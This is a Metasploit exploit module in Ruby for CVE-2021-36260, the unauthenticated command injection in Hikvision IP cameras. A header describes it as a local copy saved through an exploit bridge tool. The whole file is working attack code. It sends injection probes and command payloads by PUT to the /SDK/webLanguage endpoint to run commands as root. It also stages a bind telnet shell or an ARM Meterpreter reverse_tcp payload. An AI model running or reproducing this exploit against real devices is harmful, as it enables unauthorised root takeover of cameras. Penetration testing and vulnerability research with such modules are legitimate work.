##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# CVE: CVE-2021-36260 — Hikvision IP Camera Unauthenticated Command Injection (blind variant)
# Affects: HWI-B120-D/W firmware V5.5.101 and similar — see Hikvision advisory for full list
# NOTE: Native EmbedXPL module hikvision_cve_2021_36260_rce_chain.py is the full chain version
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("hikvision_cve_2021_36260_blind")
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Hikvision IP Camera Unauthenticated Command Injection (CVE-2021-36260)',
      'Description' => %q{
        Exploits unauthenticated command injection in /SDK/webLanguage endpoint via PUT.
        Specifically tests for the blind variant (timeout-based). Executes as root.
        Payloads have very limited space (23 bytes effective) — bind_busybox_telnetd recommended.
      },
      'License' => MSF_LICENSE,
      'Author' => ['Watchful_IP', 'bashis', 'jbaines-r7'],
      'References' => [
        ['CVE', '2021-36260'],
        ['URL', 'https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html'],
        ['URL', 'https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/']
      ],
      'DisclosureDate' => '2021-09-18',
      'Privileged' => false,
      'Targets' => [
        ['Unix Command', {'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Type' => :unix_cmd,
          'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd', 'LOGIN_CMD' => 'sh', 'Space' => 23}}],
        ['Linux Dropper (ARM)', {'Platform' => 'linux', 'Arch' => [ARCH_ARMLE], 'Type' => :linux_dropper,
          'CmdStagerFlavor' => ['printf', 'echo'],
          'DefaultOptions' => {'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'}}]
      ],
      'DefaultTarget' => 0,
      'DefaultOptions' => {'RPORT' => 80, 'SSL' => false, 'MeterpreterTryToFork' => true},
      'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]}
    ))
    register_options([OptString.new('TARGETURI', [true, 'Base path', '/'])])
  end

  def check
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/'))
    return CheckCode::Unknown('No response') unless res
    return CheckCode::Safe('Not 200') unless res.code == 200
    return CheckCode::Safe('Not Hikvision') unless res.body.include?('/doc/page/login.asp?_')
    # Test for blind injection via sleep timing
    payload_probe = ' $(cat /proc/cpuinfo) '
    res2 = send_request_cgi('method' => 'PUT', 'uri' => normalize_uri(target_uri.path, '/SDK/webLanguage'), 'data' => payload_probe)
    return CheckCode::Unknown('No response to probe') unless res2
    return CheckCode::Safe('Unexpected response code') unless res2.code == 200 || res2.code == 500
    sleep_payload = ' $(sleep 20) '
    res3 = send_request_cgi({'method' => 'PUT', 'uri' => normalize_uri(target_uri.path, '/SDK/webLanguage'), 'data' => sleep_payload}, 10)
    return CheckCode::Appears('Target executed sleep command (blind RCE confirmed)') unless res3
    CheckCode::Safe('Sleep did not time out — target may not be vulnerable')
  end

  def execute_command(cmd, _opts = {})
    cmd = cmd.gsub(%r{tmp/[0-9a-zA-Z]+}, @fname)
    cmd = cmd.gsub(/ >/, '>').gsub(/> /, '>')
    payload_data = " $(#{cmd}) "
    res = send_request_cgi('method' => 'PUT', 'uri' => normalize_uri(target_uri.path, '/SDK/webLanguage'), 'data' => payload_data)
    fail_with(Failure::Disconnected, 'Connection failed') unless res
    fail_with(Failure::UnexpectedReply, "HTTP #{res.code}") unless res.code == 200 || res.code == 500
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    @fname = "tmp/#{Rex::Text.rand_text_alpha(1)}"
    case target['Type']
    when :unix_cmd; execute_command(payload.encoded)
    when :linux_dropper; execute_cmdstager(linemax: 26)
    end
  end
end
